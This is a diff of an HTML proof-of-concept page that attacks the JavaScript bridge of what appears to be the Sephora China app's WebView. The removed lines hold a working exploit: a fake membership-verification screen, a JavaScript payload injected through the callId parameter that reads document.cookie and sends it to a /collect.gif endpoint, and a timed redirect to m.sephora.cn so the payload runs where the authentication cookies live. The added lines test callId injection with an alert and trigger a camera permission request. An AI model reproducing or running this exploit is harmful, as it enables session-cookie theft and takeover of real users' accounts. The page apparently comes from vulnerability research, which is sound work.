@@ -1,82 +1,43 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>加载中…</title>
-<style>
-body{font-family:-apple-system,sans-serif;margin:0;background:#0d0d0d;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:20px}
-.spinner{width:40px;height:40px;border:4px solid rgba(201,169,110,.2);border-top-color:#c9a96e;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}
-@keyframes spin{to{transform:rotate(360deg)}}
-h2{color:#c9a96e;font-size:18px;margin:0 0 8px}
-p{color:rgba(255,255,255,.5);font-size:13px;margin:0}
-#exfil{display:none;position:fixed;bottom:0;left:0;right:0;background:#cc0000;color:#fff;padding:12px;font-family:monospace;font-size:12px;word-break:break-all;z-index:99999;text-align:left;max-height:200px;overflow-y:auto}
-</style>
-</head>
-<body>
-<div class="spinner"></div>
-<h2 id="status">正在验证会员身份…</h2>
-<p id="detail">请稍候，即将跳转丝芙兰会员中心</p>
-<div id="exfil"></div>
-
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>测试</title></head>
+<body style="background:#111;color:#fff;font-family:monospace;padding:20px;font-size:14px">
+<h3 style="color:#c9a96e">callId 注入测试</h3>
+<div id="log" style="white-space:pre-wrap"></div>
 <script>
-var hasBridge = typeof window.appHandler !== 'undefined';
-var BASE = location.origin;
+var log = document.getElementById('log');
+function L(s) { log.textContent += s + "\n"; }
 
-// 回调接收器（接收从 m.sephora.cn 域注入回来的数据）
-window.sep = window.sep || {};
-window.sep._onSuccess = function(callId, data) {
-    // 如果是从 sephora.cn 域回来的回调，这里有 cookie 数据
-    show("CALLBACK FIRED! callId=" + callId + " data=" + data);
-};
-window.sep._onFailure = function(callId, err) {
-    show("CALLBACK FAILED! callId=" + callId + " err=" + err);
-};
+L("bridge: " + (typeof window.appHandler !== 'undefined' ? 'YES' : 'NO'));
+L("origin: " + location.origin);
 
-function show(msg) {
-    var el = document.getElementById('exfil');
-    el.style.display = 'block';
-    el.innerHTML += msg + '<hr>';
-    document.getElementById('status').textContent = '⚠️ 攻击已触发';
-}
+if (typeof window.appHandler !== 'undefined') {
+    // 回调接收
+    window.sep = window.sep || {};
+    window.sep._onSuccess = function(id, d) { L("SUCCESS cb id=" + id); };
+    window.sep._onFailure = function(id, e) { L("FAIL cb id=" + id); };
 
-if (!hasBridge) {
-    document.getElementById('status').textContent = '❌ 不在丝芙兰 APP 内';
-    document.getElementById('detail').textContent = '需要通过 sephora://openurl 打开';
-} else {
-    // ═════════════════════════════════════════════════
-    // 攻击核心：callId 注入 + 竞速导航
-    // ═════════════════════════════════════════════════
+    // 测试1: 正常调用 getExpFlag (确认 bridge 工作)
+    L("\n--- test1: normal getExpFlag ---");
+    try {
+        appHandler.appMonitorScript('getExpFlag', 'normal_id', '{"expKey":"test"}');
+        L("called OK");
+    } catch(e) { L("error: " + e); }
 
-    // 1. 调 vaSkuFinder（内部会阻塞调 API，延迟 1-3 秒）
-    //    callId 里藏恶意 JS：偷 document.cookie 并外传
-    var maliciousCallId = "0);" +
-        "var c=document.cookie;" +
-        // 外传 cookie 到攻击者收集端
-        "new Image().src='" + BASE + "/collect.gif?cookie='+encodeURIComponent(c.substring(0,1800));" +
-        // 也在页面下方显示（可视化证明）
-        "var d=document.createElement('div');" +
-        "d.style.cssText='position:fixed;bottom:0;left:0;right:0;z-index:99999;background:#cc0000;color:#fff;padding:12px;font-family:monospace;font-size:12px;word-break:break-all';" +
-        "d.innerHTML='<b>!! COOKIE STOLEN ('+c.length+' chars):</b><br>'+c.substring(0,500);" +
-        "document.body.appendChild(d);" +
-        "//";
+    // 测试2: callId 注入 alert (确认注入可行)
+    L("\n--- test2: callId injection alert ---");
+    try {
+        appHandler.appMonitorScript('getExpFlag', "0);alert('CALLID_INJECTION_WORKS');//", '{"expKey":"test"}');
+        L("called OK (alert should show)");
+    } catch(e) { L("error: " + e); }
 
-    window.appHandler.appMonitorScript('vaSkuFinder', maliciousCallId, '{"skuIdList":["1001"]}');
-
-    // 2. 立刻跳转到 m.sephora.cn（cookie 所在域）
-    //    vaSkuFinder 的 API 调用还在进行中
-    //    当 API 返回时，回调会在 m.sephora.cn 上下文执行
-    //    loadUrl("javascript:sep._onSuccess(0);[恶意JS];//,...)")
-    //    → document.cookie = Token=TGT-...; UID=... ← sephora.cn 的认证 cookie!
-    setTimeout(function() {
-        document.getElementById('detail').textContent = '正在打开丝芙兰…';
-        location.href = 'https://m.sephora.cn/';
-    }, 100); // 100ms 后跳转，给 vaSkuFinder 时间启动
-
-    // 3. 竞速窗口：
-    //    vaSkuFinder API 延迟: ~1-3 秒（网络调用）
-    //    m.sephora.cn 加载:    ~1-2 秒
-    //    如果 API 比 页面加载慢 → 回调落在 m.sephora.cn → 拿到 cookie!
+    // 测试3: requestPermission (确认弹窗)
+    L("\n--- test3: requestPermission ---");
+    try {
+        appHandler.appMonitorScript('requestPermission', 'perm_test', '{"permission":"android.permission.CAMERA"}');
+        L("called OK (dialog should show)");
+    } catch(e) { L("error: " + e); }
 }
 </script>
 </body>
